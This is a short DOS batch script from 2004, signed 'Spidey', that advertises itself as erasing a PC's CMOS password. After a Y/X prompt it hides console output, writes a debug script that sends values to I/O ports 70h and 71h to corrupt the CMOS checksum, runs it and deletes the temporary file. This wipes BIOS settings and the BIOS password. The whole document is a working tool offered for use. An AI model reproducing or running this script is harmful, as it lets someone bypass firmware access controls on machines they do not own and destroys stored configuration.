@echo off
echo  北北北                        MS-Ayu Kill Cmos                          北北北
echo  北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北北
echo                                       _                       __
echo                     _______________  /_/      _ _________    / /
echo                    / ______/  ____ \_ _______/ / _____ \ \  / /
echo                    \______ \  _____/ / _____  / _______/\ \/ /
echo                    / ______/__/__ /_/\_______/\_______/__\  /
echo                    \/ \____________________________________/
echo                           ...:::: S p i d e y ::::...
echo.
echo  This's my first Batch
echo.
echo  * Date            - June, 04, 2004
echo  * Dedicate        - Ms. Ayu (MISC-Sub)
echo  * Target to kill  - CMOS (expecialy the Password)
echo  * Author          - Spidey
echo  * Contact         - G2iP(at)SoftHome(dot)net
echo.
echo.
echo  If you press Y this shit will erase your Cmos Password
echo.
echo  Press Y to continue Kill the target...
echo  Press X Quit
choice /c:YX>nul
if errorlevel 2 goto done
if errorlevel 1 goto Y
echo CHOICE missing
goto done

:Y
ctty nul
cls
@echo o 70 2e>>c:\Spidey.deb
@echo o 71 ff>>c:\Spidey.deb
@echo q>>c:\Spidey.deb
@debug<c:\Spidey.deb
@del c:\Spidey.deb>nul
ctty con
cls
goto done

:done
cls